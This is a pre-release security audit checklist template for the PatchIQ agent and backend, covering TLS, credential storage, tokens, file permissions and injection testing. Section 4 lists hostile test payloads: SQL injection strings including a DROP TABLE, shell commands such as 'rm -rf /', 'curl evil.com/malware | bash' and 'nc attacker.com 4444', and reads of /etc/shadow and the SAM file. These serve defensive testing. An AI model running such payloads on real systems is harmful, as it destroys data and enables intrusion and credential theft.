# Security Audit Checklist

## Overview

This comprehensive security audit checklist covers all critical security aspects of the PatchIQ agent and backend system before production release.

**Audit Date:** _______________
**Auditor:** _______________
**Version:** 1.0.0

---

## 1. TLS/Transport Security

### Agent → Backend Communication

- [ ] **TLS 1.2+ Enforced**
  - Agent rejects TLS 1.0/1.1 connections
  - Backend requires TLS 1.2 minimum
  - Test with: `openssl s_client -connect backend:443 -tls1_1` (should fail)

- [ ] **Certificate Validation**
  - Agent validates backend certificate
  - Agent checks certificate expiration
  - Agent verifies certificate chain
  - Agent rejects self-signed certs in production mode

- [ ] **No TLS Disable Option**
  - No environment variable to disable TLS
  - No config option to skip verification
  - No `--insecure` flag
  - Code review confirms TLS cannot be bypassed

- [ ] **Cipher Suite Security**
  - Strong ciphers only (AES-256, ChaCha20)
  - No weak ciphers (DES, RC4, MD5)
  - Forward secrecy enabled (ECDHE)

- [ ] **Certificate Pinning (Optional)**
  - If implemented, pinning works correctly
  - Pin rotation mechanism in place

**Status:** [ ] PASS [ ] FAIL [ ] N/A
**Notes:**
```

```

---

## 2. Credential Storage

### Windows

- [ ] **DPAPI Encryption**
  - Credentials encrypted with DPAPI
  - Stored in `%LOCALAPPDATA%\PatchIQ\credentials.dat`
  - File permissions: Only SYSTEM can read
  - Test: Try to read as non-SYSTEM user (should fail)

- [ ] **Alternative: Encrypted File**
  - AES-256 encryption
  - Key derived from machine-specific data
  - File permissions: 0600 or Windows equivalent

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### macOS

- [ ] **Keychain Storage**
  - Credentials stored in macOS Keychain
  - Agent binary signed (required for Keychain access)
  - Keychain item access restricted to agent

- [ ] **Alternative: Encrypted File**
  - AES-256 encryption
  - File permissions: 0600 (rw-------)
  - Owner: root
  - Location: `/Library/Application Support/PatchIQ/Agent/.credentials`

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Linux

- [ ] **Encrypted File Storage**
  - File: `/var/lib/patchiq/agent/.credentials`
  - Permissions: 0600 (rw-------)
  - Owner: root:root
  - Encryption: AES-256-GCM
  - Key derivation: Machine ID + Agent ID

- [ ] **File Permissions Verification**
  ```bash
  stat -c "%a %U:%G" /var/lib/patchiq/agent/.credentials
  # Expected: 600 root:root
  ```

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 3. API Authentication & Authorization

### Token Management

- [ ] **Token Expiration**
  - Tokens expire after configured time (default: 24 hours)
  - Expired tokens rejected by backend
  - Test: Use expired token, expect 401

- [ ] **Token Refresh**
  - Agent refreshes tokens before expiration
  - Refresh endpoint secured
  - Refresh token rotation implemented

- [ ] **Token Revocation**
  - Tokens can be revoked server-side
  - Revoked tokens immediately invalid
  - Agent handles 401 and re-authenticates

- [ ] **Token Storage**
  - Tokens not logged
  - Tokens not in URLs (query parameters)
  - Tokens in Authorization header only

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Rate Limiting

- [ ] **Backend Rate Limiting**
  - Rate limiting enabled
  - Limits documented
  - 429 status code returned when exceeded
  - Retry-After header provided

- [ ] **Endpoint-Specific Limits**
  - Registration: 10/hour per IP
  - Heartbeat: 120/hour per agent
  - Deployments: 100/hour per agent
  - Inventory: 24/day per agent

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Authorization

- [ ] **Agent Isolation**
  - Agent A cannot access Agent B's data
  - Test: Use Agent A token to query Agent B endpoint (should fail)

- [ ] **Role-Based Access Control (Backend)**
  - Admin vs user roles enforced
  - Agents cannot access admin endpoints
  - Test: Agent token on admin endpoint (should fail 403)

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 4. Injection Vulnerabilities

### SQL Injection (Backend)

- [ ] **Parameterized Queries**
  - All database queries use parameterized statements
  - No string concatenation for SQL
  - Prisma ORM prevents most SQL injection

- [ ] **Input Validation**
  - All user inputs validated
  - Zod schemas on all API endpoints
  - Length limits enforced

- [ ] **Testing**
  - SQL injection payloads tested:
    - `' OR '1'='1`
    - `'; DROP TABLE agents; --`
    - `1' UNION SELECT * FROM users --`
  - All payloads rejected/escaped

**Test Results:**
```
Payload: ' OR '1'='1
Result: [ ] Blocked [ ] Escaped [ ] Vulnerable

Payload: '; DROP TABLE agents; --
Result: [ ] Blocked [ ] Escaped [ ] Vulnerable
```

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Command Injection (Agent Executors)

- [ ] **No Shell Command Execution**
  - Executors use native APIs (not shell commands)
  - Windows: PowerShell cmdlets, not cmd.exe
  - macOS/Linux: exec syscalls, not bash/sh

- [ ] **Input Sanitization**
  - Package names/versions sanitized
  - No special characters in package IDs
  - Whitelist validation for package sources

- [ ] **Testing**
  - Command injection payloads tested:
    - `package-name; rm -rf /`
    - `package-name && curl evil.com/malware | bash`
    - `package-name | nc attacker.com 4444`
  - All payloads rejected

**Test Results:**
```
Payload: package; rm -rf /
Result: [ ] Blocked [ ] Sanitized [ ] Vulnerable

Payload: package && malware
Result: [ ] Blocked [ ] Sanitized [ ] Vulnerable
```

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Path Traversal

- [ ] **Path Validation**
  - File paths validated and sanitized
  - No `../` allowed in file paths
  - Paths restricted to designated directories

- [ ] **Testing**
  - Path traversal payloads tested:
    - `../../etc/passwd`
    - `..\\..\\windows\\system32\\config\\sam`
    - `/etc/shadow`
  - All blocked

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Script Injection (Hub-Centric Bundles)

- [ ] **Script Validation**
  - Scripts validated before execution
  - No arbitrary code execution
  - Sandboxing/restrictions in place

- [ ] **Manifest Signature**
  - Bundle manifest signed
  - Signature verified before extraction
  - Tampered bundles rejected

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 5. Man-in-the-Middle (MITM) Resistance

### Update Manifest Security

- [ ] **Manifest Signature Verification**
  - Update manifest digitally signed
  - Agent verifies signature before processing
  - Invalid signatures rejected
  - Test: Tamper with manifest, expect rejection

- [ ] **Public Key Pinning**
  - Agent has embedded public key
  - Manifest signed with corresponding private key
  - Key rotation mechanism documented

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Binary Checksum Validation

- [ ] **Checksum Verification**
  - Agent binary checksum in manifest
  - SHA-256 checksum verified before execution
  - Mismatched checksums rejected
  - Test: Modify binary, expect checksum failure

- [ ] **Download Integrity**
  - Downloads verified with checksum
  - Partial downloads detected and rejected
  - Corrupted files not executed

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### HTTPS Enforcement

- [ ] **No HTTP Fallback**
  - Agent never falls back to HTTP
  - HTTP redirect to HTTPS not followed
  - Test: Force HTTP, expect connection failure

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 6. File Permissions & Access Control

### Binary Permissions

- [ ] **Windows**
  - Executable: `C:\Program Files\PatchIQ\Agent\patchiq-agent.exe`
  - Permissions: Full Control for SYSTEM, Read & Execute for Administrators
  - Not writable by non-admin users
  - Test: Try to modify as standard user (should fail)

- [ ] **macOS**
  - Executable: `/Library/Application Support/PatchIQ/Agent/patchiq-agent`
  - Permissions: 755 or 700
  - Owner: root:wheel
  - Test: `ls -l` and verify

- [ ] **Linux**
  - Executable: `/usr/bin/patchiq-agent`
  - Permissions: 755
  - Owner: root:root
  - Test: `ls -l` and verify

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Config File Permissions

- [ ] **Windows**
  - Config: `C:\ProgramData\PatchIQ\Agent\config.yaml`
  - Permissions: Full Control for SYSTEM, Read for Administrators
  - Not readable by standard users

- [ ] **macOS**
  - Config: `/Library/Application Support/PatchIQ/Agent/config.yaml`
  - Permissions: 644 or 600
  - Owner: root:wheel

- [ ] **Linux**
  - Config: `/etc/patchiq/agent.yaml`
  - Permissions: 600
  - Owner: root:root

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Log File Permissions

- [ ] **Windows**
  - Logs: `C:\ProgramData\PatchIQ\Agent\logs\`
  - Permissions: SYSTEM full control, Administrators read
  - Log rotation configured

- [ ] **macOS**
  - Logs: `/Library/Logs/PatchIQ/`
  - Permissions: 644 (readable for troubleshooting)
  - Owner: root:wheel

- [ ] **Linux**
  - Logs: `/var/log/patchiq/`
  - Permissions: 644
  - Owner: root:root

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Data Directory Permissions

- [ ] **Windows**
  - Data: `C:\ProgramData\PatchIQ\Agent\data\`
  - Permissions: SYSTEM full control only

- [ ] **macOS**
  - Data: `/Library/Application Support/PatchIQ/Agent/data/`
  - Permissions: 700
  - Owner: root:wheel

- [ ] **Linux**
  - Data: `/var/lib/patchiq/agent/`
  - Permissions: 700
  - Owner: root:root

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 7. Privilege & Process Security

### Agent Process Privileges

- [ ] **Windows**
  - Service runs as: LocalSystem or NetworkService
  - If LocalSystem: Justify why (document)
  - Restricted tokens if possible

- [ ] **macOS/Linux**
  - Process runs as: root (required for many operations)
  - Drop privileges where possible
  - Capabilities model considered (Linux)

**Status:** [ ] PASS [ ] FAIL [ ] N/A
**Notes:**
```

```

### SELinux / AppArmor (Linux)

- [ ] **SELinux Policy**
  - Agent works with SELinux enforcing
  - Custom policy created if needed
  - No AVC denials in audit log
  - Test: `ausearch -m avc -ts recent | grep patchiq`

- [ ] **AppArmor Profile (Ubuntu/Debian)**
  - AppArmor profile created if needed
  - Profile in complain or enforce mode
  - No violations logged

**Status:** [ ] PASS [ ] FAIL [ ] N/A
**Notes:**
```

```

---

## 8. Input Validation & Output Encoding

### API Input Validation

- [ ] **Zod Schemas**
  - All API endpoints have Zod schemas
  - Schema validation enforced before processing
  - Invalid inputs rejected with 400

- [ ] **Length Limits**
  - Strings have max length (prevent DoS)
  - Arrays have max items
  - Numbers have min/max ranges

- [ ] **Type Validation**
  - UUIDs validated
  - Emails validated
  - URLs validated

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

### Output Encoding

- [ ] **XSS Prevention (Frontend)**
  - React escapes output by default
  - No `dangerouslySetInnerHTML` without sanitization
  - User-generated content sanitized

- [ ] **API Response Sanitization**
  - No sensitive data in error messages
  - Stack traces not exposed in production
  - Error messages generic

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 9. Secrets Management

### Hardcoded Secrets Audit

- [ ] **No Hardcoded Credentials**
  - Code search for keywords: password, secret, api_key, token
  - No credentials in source code
  - No credentials in config files committed to Git

- [ ] **Environment Variables**
  - Secrets loaded from environment
  - `.env` files in `.gitignore`
  - Example `.env.example` provided (no real values)

- [ ] **Secret Rotation**
  - Process documented for rotating secrets
  - Backend supports secret rotation without downtime

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 10. Logging & Monitoring

### Security Event Logging

- [ ] **Authentication Events**
  - Failed login attempts logged
  - Successful logins logged
  - Token refreshes logged

- [ ] **Authorization Events**
  - Access denied (403) logged
  - Unauthorized (401) logged

- [ ] **Sensitive Data Not Logged**
  - Passwords not logged
  - Tokens not logged in full (only first 8 chars)
  - API keys not logged

- [ ] **Log Injection Prevention**
  - Log messages sanitized
  - No newlines in user input
  - Structured logging (JSON) preferred

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 11. OWASP Top 10 Coverage

### A01:2021 - Broken Access Control
- [ ] Covered by section 3 (API Authorization)

### A02:2021 - Cryptographic Failures
- [ ] Covered by sections 1 (TLS), 2 (Credential Storage), 5 (MITM)

### A03:2021 - Injection
- [ ] Covered by section 4 (Injection Vulnerabilities)

### A04:2021 - Insecure Design
- [ ] Architecture reviewed (hub-centric, zero-trust)

### A05:2021 - Security Misconfiguration
- [ ] Covered by section 6 (File Permissions)

### A06:2021 - Vulnerable and Outdated Components
- [ ] Dependency audit completed (see separate report)

### A07:2021 - Identification and Authentication Failures
- [ ] Covered by section 3 (API Authentication)

### A08:2021 - Software and Data Integrity Failures
- [ ] Covered by section 5 (MITM, Signatures)

### A09:2021 - Security Logging and Monitoring Failures
- [ ] Covered by section 10 (Logging)

### A10:2021 - Server-Side Request Forgery (SSRF)
- [ ] Backend validates all external URLs
- [ ] Internal network access restricted

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## 12. Dependency Security

### Vulnerability Scanning

- [ ] **Backend (Node.js)**
  - `npm audit` run, all critical/high vulnerabilities fixed
  - Dependencies up to date
  - Renovate or Dependabot configured

- [ ] **Frontend (React)**
  - `npm audit` run, all critical/high vulnerabilities fixed
  - Dependencies up to date

- [ ] **Agent (Go)**
  - `go list -m all | nancy sleuth` run
  - All critical/high vulnerabilities fixed

**Status:** [ ] PASS [ ] FAIL
**Notes:**
```

```

---

## Summary

### Critical Issues (Must Fix Before Production)
```
1. [Issue description]
2. [Issue description]
...
```

### High Priority Issues (Fix Soon)
```
1. [Issue description]
2. [Issue description]
...
```

### Medium Priority Issues (Address in Future Release)
```
1. [Issue description]
2. [Issue description]
...
```

### Low Priority / Informational
```
1. [Issue description]
2. [Issue description]
...
```

---

## Sign-Off

**Overall Security Posture:** [ ] Production Ready [ ] Needs Work [ ] Not Ready

**Auditor Signature:** _______________
**Date:** _______________

**Approver Signature:** _______________
**Date:** _______________

---

**Document Status:** Approved Template
**Last Updated:** 2026-02-14
**Version:** 1.0
